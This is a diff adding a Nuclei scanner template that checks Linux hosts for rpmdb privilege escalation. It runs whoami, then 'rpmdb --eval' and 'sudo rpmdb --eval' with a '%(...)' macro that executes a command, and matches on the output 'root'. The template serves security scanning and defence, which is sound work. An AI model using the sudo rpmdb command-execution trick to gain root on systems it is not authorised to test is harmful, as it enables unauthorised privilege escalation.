@@ -1,0 +1,49 @@
+id: privesc-rpmdb
+
+info:
+  name: rpmdb - Privilege Escalation
+  author: daffainfo
+  severity: high
+  description: |
+    The rpmdb is the database used by the RPM Package Manager to store metadata about installed packages on a Linux system. It is used to track information about installed packages, including their files, dependencies, and other attributes. The rpmdb is a critical component of package management on RPM-based Linux distributions.
+  reference:
+    - https://gtfobins.github.io/gtfobins/rpmdb/
+  metadata:
+    verified: true
+    max-request: 3
+  tags: code,linux,rpmdb,privesc,local
+
+self-contained: true
+code:
+  - engine:
+      - sh
+      - bash
+    source: |
+      whoami
+
+  - engine:
+      - sh
+      - bash
+    source: |
+      rpmdb --eval '%(whoami 1>&2)'
+
+  - engine:
+      - sh
+      - bash
+    source: |
+      sudo rpmdb --eval '%(whoami 1>&2)'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: code_1_response
+        words:
+          - "root"
+        negative: true
+
+      - type: dsl
+        dsl:
+          - 'contains(code_2_response, "root")'
+          - 'contains(code_3_response, "root")'
+        condition: or
+# digest: 4a0a0047304502201d4a3a1a08d80ded3c174754d63979933d7e871699d21e033dea29588c8bfeee022100ea44573832e58d65c974033cdd2425a885593a0f3c361549890b5f3796cf90b4:922c64590222798bb761d5b6d8e72950
